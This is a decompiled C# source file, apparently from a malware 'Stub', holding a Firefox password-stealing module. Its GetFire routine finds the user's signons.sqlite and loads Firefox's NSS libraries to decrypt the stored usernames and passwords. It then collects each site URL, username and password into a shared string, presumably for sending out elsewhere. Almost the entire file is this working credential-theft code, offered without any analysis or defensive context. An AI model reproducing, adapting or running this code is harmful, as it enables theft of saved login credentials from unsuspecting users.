using System;
using System.Collections;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	// Token: 0x0200000F RID: 15
	[StandardModule]
	internal sealed class firefox5
	{
		// Token: 0x0600004B RID: 75 RVA: 0x00003F68 File Offset: 0x00002168
		public static string GetFire()
		{
			checked
			{
				try
				{
					bool flag = false;
					string text = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
					string path = Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles";
					string[] directories = Directory.GetDirectories(path);
					foreach (string text2 in directories)
					{
						bool flag2 = !flag;
						if (!flag2)
						{
							break;
						}
						string[] files = Directory.GetFiles(text2);
						foreach (string input in files)
						{
							flag2 = !flag;
							if (!flag2)
							{
								break;
							}
							bool flag3 = Regex.IsMatch(input, "signons.sqlite");
							if (flag3)
							{
								firefox5.NSS_Init(text2);
								firefox5.signon = input;
							}
						}
					}
					string baseName = firefox5.signon;
					firefox5.TSECItem tsecitem = default(firefox5.TSECItem);
					firefox5.TSECItem tsecitem2 = default(firefox5.TSECItem);
					firefox5.TSECItem tsecitem3 = default(firefox5.TSECItem);
					firefox5.SQLiteBase5 sqliteBase = new firefox5.SQLiteBase5(baseName);
					DataTable dataTable = sqliteBase.ExecuteQuery("SELECT * FROM moz_logins;");
					DataTable dataTable2 = sqliteBase.ExecuteQuery("SELECT * FROM moz_disabledHosts;");
					try
					{
						foreach (object obj in dataTable2.Rows)
						{
							DataRow dataRow = (DataRow)obj;
						}
					}
					finally
					{
						IEnumerator enumerator;
						bool flag3 = enumerator is IDisposable;
						if (flag3)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					long slot = firefox5.PK11_GetInternalKeySlot();
					firefox5.PK11_Authenticate(slot, true, 0L);
					try
					{
						foreach (object obj2 in dataTable.Rows)
						{
							DataRow dataRow2 = (DataRow)obj2;
							string text3 = Convert.ToString(dataRow2["formSubmitURL"].ToString());
							string text4 = text3;
							string text5 = "";
							string text6 = "";
							StringBuilder stringBuilder = new StringBuilder(dataRow2["encryptedUsername"].ToString());
							int value = firefox5.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
							IntPtr intPtr = new IntPtr(value);
							firefox5.TSECItem tsecitem4 = (firefox5.TSECItem)Marshal.PtrToStructure(intPtr, typeof(firefox5.TSECItem));
							bool flag3 = firefox5.PK11SDR_Decrypt(ref tsecitem4, ref tsecitem2, 0) == 0;
							if (flag3)
							{
								bool flag2 = tsecitem2.SECItemLen != 0;
								if (flag2)
								{
									byte[] array3 = new byte[tsecitem2.SECItemLen - 1 + 1];
									intPtr = new IntPtr(tsecitem2.SECItemData);
									Marshal.Copy(intPtr, array3, 0, tsecitem2.SECItemLen);
									text5 = Encoding.UTF8.GetString(array3);
								}
							}
							StringBuilder stringBuilder2 = new StringBuilder(dataRow2["encryptedPassword"].ToString());
							int value2 = firefox5.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
							intPtr = new IntPtr(value2);
							firefox5.TSECItem tsecitem5 = (firefox5.TSECItem)Marshal.PtrToStructure(intPtr, typeof(firefox5.TSECItem));
							flag3 = (firefox5.PK11SDR_Decrypt(ref tsecitem5, ref tsecitem3, 0) == 0);
							if (flag3)
							{
								bool flag2 = tsecitem3.SECItemLen != 0;
								if (flag2)
								{
									byte[] array3 = new byte[tsecitem3.SECItemLen - 1 + 1];
									intPtr = new IntPtr(tsecitem3.SECItemData);
									Marshal.Copy(intPtr, array3, 0, tsecitem3.SECItemLen);
									text6 = Encoding.UTF8.GetString(array3);
								}
							}
							p.OL = string.Concat(new string[]
							{
								p.OL,
								"|URL| ",
								text4,
								"\r\n|USR| ",
								text5,
								"\r\n|PWD| ",
								text6,
								"\r\n"
							});
						}
					}
					finally
					{
						IEnumerator enumerator2;
						bool flag3 = enumerator2 is IDisposable;
						if (flag3)
						{
							(enumerator2 as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
				}
				string result;
				return result;
			}
		}

		// Token: 0x0600004C RID: 76
		[DllImport("kernel32.dll")]
		private static extern IntPtr LoadLibrary(string dllFilePath);

		// Token: 0x0600004D RID: 77
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		// Token: 0x0600004E RID: 78 RVA: 0x000043EC File Offset: 0x000025EC
		public static long NSS_Init(string configdir)
		{
			string text = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
			bool flag = text.Contains("nss3.dll");
			if (flag)
			{
				firefox5.LoadLibrary(text + "mozutils.dll");
				firefox5.LoadLibrary(text + "mozglue.dll");
				firefox5.LoadLibrary(text + "mozcrt19.dll");
				firefox5.LoadLibrary(text + "nspr4.dll");
				firefox5.LoadLibrary(text + "plc4.dll");
				firefox5.LoadLibrary(text + "plds4.dll");
				firefox5.LoadLibrary(text + "ssutil3.dll");
				firefox5.LoadLibrary(text + "mozsqlite3.dll");
				firefox5.LoadLibrary(text + "nssutil3.dll");
				firefox5.LoadLibrary(text + "softokn3.dll");
				firefox5.NSS3 = firefox5.LoadLibrary(text + "nss3.dll");
			}
			else
			{
				firefox5.LoadLibrary(text + "mozutils.dll");
				firefox5.LoadLibrary(text + "mozglue.dll");
				firefox5.LoadLibrary(text + "mozcrt19.dll");
				firefox5.LoadLibrary(text + "nspr4.dll");
				firefox5.LoadLibrary(text + "plc4.dll");
				firefox5.LoadLibrary(text + "plds4.dll");
				firefox5.LoadLibrary(text + "ssutil3.dll");
				firefox5.LoadLibrary(text + "mozsqlite3.dll");
				firefox5.LoadLibrary(text + "nssutil3.dll");
				firefox5.LoadLibrary(text + "softokn3.dll");
			}
			IntPtr procAddress = firefox5.GetProcAddress(firefox5.NSS3, "NSS_Init");
			firefox5.DLLFunctionDelegate dllfunctionDelegate = (firefox5.DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(firefox5.DLLFunctionDelegate));
			return dllfunctionDelegate(configdir);
		}

		// Token: 0x0600004F RID: 79 RVA: 0x000045C8 File Offset: 0x000027C8
		public static long PK11_GetInternalKeySlot()
		{
			IntPtr procAddress = firefox5.GetProcAddress(firefox5.NSS3, "PK11_GetInternalKeySlot");
			firefox5.DLLFunctionDelegate2 dllfunctionDelegate = (firefox5.DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(firefox5.DLLFunctionDelegate2));
			return dllfunctionDelegate();
		}

		// Token: 0x06000050 RID: 80 RVA: 0x0000460C File Offset: 0x0000280C
		public static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
		{
			IntPtr procAddress = firefox5.GetProcAddress(firefox5.NSS3, "PK11_Authenticate");
			firefox5.DLLFunctionDelegate3 dllfunctionDelegate = (firefox5.DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(firefox5.DLLFunctionDelegate3));
			return dllfunctionDelegate(slot, loadCerts, wincx);
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00004650 File Offset: 0x00002850
		public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
		{
			IntPtr procAddress = firefox5.GetProcAddress(firefox5.NSS3, "NSSBase64_DecodeBuffer");
			firefox5.DLLFunctionDelegate4 dllfunctionDelegate = (firefox5.DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(firefox5.DLLFunctionDelegate4));
			return dllfunctionDelegate(arenaOpt, outItemOpt, inStr, inLen);
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00004698 File Offset: 0x00002898
		public static int PK11SDR_Decrypt(ref firefox5.TSECItem data, ref firefox5.TSECItem result, int cx)
		{
			IntPtr procAddress = firefox5.GetProcAddress(firefox5.NSS3, "PK11SDR_Decrypt");
			firefox5.DLLFunctionDelegate5 dllfunctionDelegate = (firefox5.DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(firefox5.DLLFunctionDelegate5));
			return dllfunctionDelegate(ref data, ref result, cx);
		}

		// Token: 0x04000023 RID: 35
		private static IntPtr NSS3;

		// Token: 0x04000024 RID: 36
		public static string signon;

		// Token: 0x02000010 RID: 16
		public class SHITEMID
		{
			// Token: 0x06000053 RID: 83 RVA: 0x000046DC File Offset: 0x000028DC
			[DebuggerNonUserCode]
			public SHITEMID()
			{
			}

			// Token: 0x04000025 RID: 37
			public static long cb;

			// Token: 0x04000026 RID: 38
			public static byte[] abID;
		}

		// Token: 0x02000011 RID: 17
		public struct TSECItem
		{
			// Token: 0x04000027 RID: 39
			public int SECItemType;

			// Token: 0x04000028 RID: 40
			public int SECItemData;

			// Token: 0x04000029 RID: 41
			public int SECItemLen;
		}

		// Token: 0x02000012 RID: 18
		// (Invoke) Token: 0x06000057 RID: 87
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long DLLFunctionDelegate(string configdir);

		// Token: 0x02000013 RID: 19
		// (Invoke) Token: 0x0600005B RID: 91
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long DLLFunctionDelegate2();

		// Token: 0x02000014 RID: 20
		// (Invoke) Token: 0x0600005F RID: 95
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);

		// Token: 0x02000015 RID: 21
		// (Invoke) Token: 0x06000063 RID: 99
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

		// Token: 0x02000016 RID: 22
		// (Invoke) Token: 0x06000067 RID: 103
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int DLLFunctionDelegate5(ref firefox5.TSECItem data, ref firefox5.TSECItem result, int cx);

		// Token: 0x02000017 RID: 23
		public class SQLiteBase5
		{
			// Token: 0x06000068 RID: 104
			[DllImport("kernel32")]
			private static extern IntPtr HeapAlloc(IntPtr heap, uint flags, uint bytes);

			// Token: 0x06000069 RID: 105
			[DllImport("kernel32")]
			private static extern IntPtr GetProcessHeap();

			// Token: 0x0600006A RID: 106
			[DllImport("kernel32")]
			private static extern int lstrlen(IntPtr str);

			// Token: 0x0600006B RID: 107
			[DllImport("mozsqlite3")]
			private static extern int sqlite3_open(IntPtr fileName, ref IntPtr database);

			// Token: 0x0600006C RID: 108
			[DllImport("mozsqlite3")]
			private static extern int sqlite3_close(IntPtr database);

			// Token: 0x0600006D RID: 109
			[DllImport("mozsqlite3")]
			private static extern int sqlite3_exec(IntPtr database, IntPtr query, IntPtr callback, IntPtr arguments, ref IntPtr error);

			// Token: 0x0600006E RID: 110
			[DllImport("mozsqlite3")]
			private static extern IntPtr sqlite3_errmsg(IntPtr database);

			// Token: 0x0600006F RID: 111
			[DllImport("mozsqlite3")]
			private static extern int sqlite3_prepare_v2(IntPtr database, IntPtr query, int length, ref IntPtr statement, ref IntPtr tail);

			// Token: 0x06000070 RID: 112
			[DllImport("mozsqlite3")]
			private static extern int sqlite3_step(IntPtr statement);

			// Token: 0x06000071 RID: 113
			[DllImport("mozsqlite3")]
			private static extern int sqlite3_column_count(IntPtr statement);

			// Token: 0x06000072 RID: 114
			[DllImport("mozsqlite3")]
			private static extern IntPtr sqlite3_column_name(IntPtr statement, int columnNumber);

			// Token: 0x06000073 RID: 115
			[DllImport("mozsqlite3")]
			private static extern int sqlite3_column_type(IntPtr statement, int columnNumber);

			// Token: 0x06000074 RID: 116
			[DllImport("mozsqlite3")]
			private static extern int sqlite3_column_int(IntPtr statement, int columnNumber);

			// Token: 0x06000075 RID: 117
			[DllImport("mozsqlite3")]
			private static extern double sqlite3_column_double(IntPtr statement, int columnNumber);

			// Token: 0x06000076 RID: 118
			[DllImport("mozsqlite3")]
			private static extern IntPtr sqlite3_column_text(IntPtr statement, int columnNumber);

			// Token: 0x06000077 RID: 119
			[DllImport("mozsqlite3")]
			private static extern IntPtr sqlite3_column_blob(IntPtr statement, int columnNumber);

			// Token: 0x06000078 RID: 120
			[DllImport("mozsqlite3")]
			private static extern IntPtr sqlite3_column_table_name(IntPtr statement, int columnNumber);

			// Token: 0x06000079 RID: 121
			[DllImport("mozsqlite3")]
			private static extern int sqlite3_finalize(IntPtr handle);

			// Token: 0x0600007A RID: 122 RVA: 0x000046E8 File Offset: 0x000028E8
			public SQLiteBase5()
			{
				this.database = IntPtr.Zero;
			}

			// Token: 0x0600007B RID: 123 RVA: 0x00004700 File Offset: 0x00002900
			public SQLiteBase5(string baseName)
			{
				this.OpenDatabase(baseName);
			}

			// Token: 0x0600007C RID: 124 RVA: 0x00004714 File Offset: 0x00002914
			public void OpenDatabase(string baseName)
			{
				bool flag = firefox5.SQLiteBase5.sqlite3_open(this.StringToPointer(baseName), ref this.database) != 0;
				if (flag)
				{
					this.database = IntPtr.Zero;
				}
			}

			// Token: 0x0600007D RID: 125 RVA: 0x00004750 File Offset: 0x00002950
			public void CloseDatabase()
			{
				bool flag = this.database != IntPtr.Zero;
				if (flag)
				{
					firefox5.SQLiteBase5.sqlite3_close(this.database);
				}
			}

			// Token: 0x0600007E RID: 126 RVA: 0x00004784 File Offset: 0x00002984
			public ArrayList GetTables()
			{
				string query = "SELECT name FROM sqlite_master WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'UNION ALL SELECT name FROM sqlite_temp_master WHERE type IN ('table','view') ORDER BY 1";
				DataTable dataTable = this.ExecuteQuery(query);
				ArrayList arrayList = new ArrayList();
				try
				{
					foreach (object obj in dataTable.Rows)
					{
						DataRow dataRow = (DataRow)obj;
						arrayList.Add(dataRow.ItemArray[0].ToString());
					}
				}
				finally
				{
					IEnumerator enumerator;
					bool flag = enumerator is IDisposable;
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				return arrayList;
			}

			// Token: 0x0600007F RID: 127 RVA: 0x0000482C File Offset: 0x00002A2C
			public void ExecuteNonQuery(string query)
			{
				IntPtr value;
				firefox5.SQLiteBase5.sqlite3_exec(this.database, this.StringToPointer(query), IntPtr.Zero, IntPtr.Zero, ref value);
				bool flag = value != IntPtr.Zero;
				if (flag)
				{
				}
			}

			// Token: 0x06000080 RID: 128 RVA: 0x00004870 File Offset: 0x00002A70
			public DataTable ExecuteQuery(string query)
			{
				IntPtr intPtr;
				IntPtr intPtr2;
				firefox5.SQLiteBase5.sqlite3_prepare_v2(this.database, this.StringToPointer(query), this.GetPointerLenght(this.StringToPointer(query)), ref intPtr, ref intPtr2);
				DataTable result = new DataTable();
				for (int num = this.ReadFirstRow(intPtr, ref result); num == 100; num = this.ReadNextRow(intPtr, ref result))
				{
				}
				firefox5.SQLiteBase5.sqlite3_finalize(intPtr);
				return result;
			}

			// Token: 0x06000081 RID: 129 RVA: 0x000048E0 File Offset: 0x00002AE0
			private int ReadFirstRow(IntPtr statement, ref DataTable table)
			{
				table = new DataTable("resultTable");
				int num = firefox5.SQLiteBase5.sqlite3_step(statement);
				bool flag = num == 100;
				checked
				{
					if (flag)
					{
						int num2 = firefox5.SQLiteBase5.sqlite3_column_count(statement);
						object[] array = new object[num2 - 1 + 1];
						int num3 = 0;
						int num4 = num2 - 1;
						int num5 = num3;
						for (;;)
						{
							int num6 = num5;
							int num7 = num4;
							if (num6 > num7)
							{
								break;
							}
							string columnName = this.PointerToString(firefox5.SQLiteBase5.sqlite3_column_name(statement, num5));
							switch (firefox5.SQLiteBase5.sqlite3_column_type(statement, num5))
							{
							case 1:
								flag = true;
								if (flag)
								{
									table.Columns.Add(columnName, Type.GetType("System.Int32"));
									array[num5] = firefox5.SQLiteBase5.sqlite3_column_int(statement, num5);
								}
								break;
							case 2:
								flag = true;
								if (flag)
								{
									table.Columns.Add(columnName, Type.GetType("System.Single"));
									array[num5] = firefox5.SQLiteBase5.sqlite3_column_double(statement, num5);
								}
								break;
							case 3:
								flag = true;
								if (flag)
								{
									table.Columns.Add(columnName, Type.GetType("System.String"));
									array[num5] = this.PointerToString(firefox5.SQLiteBase5.sqlite3_column_text(statement, num5));
								}
								break;
							case 4:
								flag = true;
								if (flag)
								{
									table.Columns.Add(columnName, Type.GetType("System.String"));
									array[num5] = this.PointerToString(firefox5.SQLiteBase5.sqlite3_column_blob(statement, num5));
								}
								break;
							default:
								flag = true;
								if (flag)
								{
									table.Columns.Add(columnName, Type.GetType("System.String"));
									array[num5] = "";
								}
								break;
							}
							num5++;
						}
						table.Rows.Add(array);
					}
					return firefox5.SQLiteBase5.sqlite3_step(statement);
				}
			}

			// Token: 0x06000082 RID: 130 RVA: 0x00004ADC File Offset: 0x00002CDC
			private int ReadNextRow(IntPtr statement, ref DataTable table)
			{
				int num = firefox5.SQLiteBase5.sqlite3_column_count(statement);
				checked
				{
					object[] array = new object[num - 1 + 1];
					int num2 = 0;
					int num3 = num - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						switch (firefox5.SQLiteBase5.sqlite3_column_type(statement, num4))
						{
						case 1:
						{
							bool flag = true;
							if (flag)
							{
								array[num4] = firefox5.SQLiteBase5.sqlite3_column_int(statement, num4);
							}
							break;
						}
						case 2:
						{
							bool flag = true;
							if (flag)
							{
								array[num4] = firefox5.SQLiteBase5.sqlite3_column_double(statement, num4);
							}
							break;
						}
						case 3:
						{
							bool flag = true;
							if (flag)
							{
								array[num4] = this.PointerToString(firefox5.SQLiteBase5.sqlite3_column_text(statement, num4));
							}
							break;
						}
						case 4:
						{
							bool flag = true;
							if (flag)
							{
								array[num4] = this.PointerToString(firefox5.SQLiteBase5.sqlite3_column_blob(statement, num4));
							}
							break;
						}
						default:
						{
							bool flag = true;
							if (flag)
							{
								array[num4] = "";
							}
							break;
						}
						}
						num4++;
					}
					table.Rows.Add(array);
					return firefox5.SQLiteBase5.sqlite3_step(statement);
				}
			}

			// Token: 0x06000083 RID: 131 RVA: 0x00004C28 File Offset: 0x00002E28
			private IntPtr StringToPointer(string str)
			{
				bool flag = str == null;
				IntPtr result;
				if (flag)
				{
					result = IntPtr.Zero;
				}
				else
				{
					Encoding utf = Encoding.UTF8;
					byte[] bytes = utf.GetBytes(str);
					uint bytes2 = checked((uint)(bytes.Length + 1));
					IntPtr intPtr = firefox5.SQLiteBase5.HeapAlloc(firefox5.SQLiteBase5.GetProcessHeap(), 0u, bytes2);
					Marshal.Copy(bytes, 0, intPtr, bytes.Length);
					Marshal.WriteByte(intPtr, bytes.Length, 0);
					result = intPtr;
				}
				return result;
			}

			// Token: 0x06000084 RID: 132 RVA: 0x00004C9C File Offset: 0x00002E9C
			private string PointerToString(IntPtr ptr)
			{
				bool flag = ptr == IntPtr.Zero;
				string result;
				if (flag)
				{
					result = null;
				}
				else
				{
					Encoding utf = Encoding.UTF8;
					int pointerLenght = this.GetPointerLenght(ptr);
					byte[] array = new byte[checked(pointerLenght - 1 + 1)];
					Marshal.Copy(ptr, array, 0, pointerLenght);
					result = utf.GetString(array, 0, pointerLenght);
				}
				return result;
			}

			// Token: 0x06000085 RID: 133 RVA: 0x00004CFC File Offset: 0x00002EFC
			private int GetPointerLenght(IntPtr ptr)
			{
				bool flag = ptr == IntPtr.Zero;
				int result;
				if (flag)
				{
					result = 0;
				}
				else
				{
					result = firefox5.SQLiteBase5.lstrlen(ptr);
				}
				return result;
			}

			// Token: 0x0400002A RID: 42
			private const int SQL_OK = 0;

			// Token: 0x0400002B RID: 43
			private const int SQL_ROW = 100;

			// Token: 0x0400002C RID: 44
			private const int SQL_DONE = 101;

			// Token: 0x0400002D RID: 45
			private IntPtr database;

			// Token: 0x02000018 RID: 24
			public enum SQLiteDataTypes
			{
				// Token: 0x0400002F RID: 47
				INT = 1,
				// Token: 0x04000030 RID: 48
				FLOAT,
				// Token: 0x04000031 RID: 49
				TEXT,
				// Token: 0x04000032 RID: 50
				BLOB,
				// Token: 0x04000033 RID: 51
				NULL
			}
		}
	}
}
